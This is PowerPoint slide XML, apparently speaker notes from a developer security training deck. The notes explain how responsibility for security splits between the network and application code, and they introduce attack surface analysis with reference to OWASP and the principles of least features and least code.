        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41133522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BC76-D2B1-D210-6C42-1AD2A3F39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804C9-4DFB-7ED9-8C1C-B0CAD59B9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6757A-560A-63F5-EC57-828CF4053296}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Think of it this way:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Network / platform / mesh / gateway</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enforce connectivity:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>who </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> talk to whom</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, IP rules, routes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Provide signals:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>which service identity called,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>what client cert was presented.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Your code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Decides what that caller is allowed to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>do</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enforces business rules and data access.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Interprets identities and roles inside domain logic.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>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8F950453-B1F2-50A0-02BC-D3C34D4DBEEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>108</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="135267259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D5568-9AA6-B45D-D18F-A378649FC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B1AAF-609B-A04A-3527-498D33D12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CD7B3-EF10-7702-41FE-30C00DDFB1FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, think of attack surface as:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Everything a red-teamer would poke at first.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OWASP’s Attack Surface Analysis cheat sheet frames it as:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>understand what parts of the app are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>open to attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>minimize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> that exposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>notice </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>when and how</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> the attack surface changes as you ship features</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html?utm_source=chatgpt.com</a:t>
            </a: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9D321526-5DE3-A957-BFD3-16A8CA7D769D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>110</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4645808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AF2D-E335-322B-601A-890728EB1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F1E33-0596-6B31-57E0-BE24CDE60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03241-8DF3-D018-EFE2-672D5E37B8EE}"/>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E333993D-5955-0908-2E60-CDFCC372DBE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>111</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="318420447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9474D-37B1-8AA1-CC20-5DF519CB9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D62A8-E48C-A546-B1D7-C2E35AED3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4AED0-E52B-74A6-E66D-E6FA95E96994}"/>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776E46D7-9F10-E9E9-760D-D803440EA278}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>112</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="285122790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06BE4-BF7A-C8D3-1916-EFFDF0D4F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BD38-3003-6B1F-66B8-C3F19880A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D0947-AAE3-8BD6-D1A8-94EC7BFFFA24}"/>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C59F6401-02E8-FC65-6E0F-D70CC9B80A80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>113</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="190616202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22A7-C898-9B59-FF84-B9BDBC0D2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29536-377D-E058-1C00-E6AD27596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AAFA3-49CD-F9E8-BDF3-783041FD8558}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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DED8A7B0-4CFF-4D95-A32F-F3206EECDD01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>114</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26387276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D7828-FCAA-1925-70AC-BCD2CA6E6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CE5F0-2440-6578-2950-B9F5C6528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E4553-D3DE-4309-0657-76CFF2E6E421}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thought experiment:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Take one of your current systems. Without looking at code, list all the ways an untrusted user (or compromised internal service) could send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>any</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> into it. That list </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> your attack surface.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4C0E8504-4961-18B5-9F0C-75789B259ACC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>115</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36417079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635F-96C3-068F-962D-DC9D2AAFA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C97A3-6D0B-10F4-7629-FE8A4777C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20E0-BD70-4263-848D-EE0CD07BCD20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Remember the 'Least' principle? (Slide 87)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">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ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Least Features </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>– Minimalize your attack surface; disable what is unused or unnecessary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Least Code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>– Fewer lines = fewer bugs = fewer vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>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FF508F05-23DA-3B4C-49BA-CF5EB9686726}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>116</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="304597996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295F-7C9D-1172-2CB3-5C8E801A9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30881-9952-286E-01A2-D10FA3B72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86C49-B2CE-2DE2-EFEF-163B420FA670}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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F8A7A551-90CA-916C-F564-9B0B246A8E74}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>117</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="85132853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627CB-8A01-4E99-2A3B-DDF01686E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17EE4-04B0-A48B-5AAC-E601CB8D1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367FF-9A32-3C52-0660-EDCB3A1636DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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C420571D-02DA-C384-8FF4-1A2517FE39F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>118</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10201094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F11A3-BAF6-01C2-350C-9F23A837F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4700D-B120-95E6-8E9E-07DAC20DF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71E7F-400B-E439-5948-0435A18C9E50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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E31C1168-DD24-1BEF-C958-979D54425C88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>119</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="418575481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683D8-EB99-9E15-821C-FEFFDA65D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BE31C-6A79-C92F-08DE-5D6DB73A2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D1A67-0DDC-B6A6-86DD-7A41AA8AE08F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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E1886736-9E6B-0186-240F-054B5B10B1FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>120</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="145739363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91E6-753C-D1C4-B307-5C1E5868E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9361E-2949-1EE4-B46F-AF3947C28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98765-AF87-E1B6-3A9F-C230FFED49FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
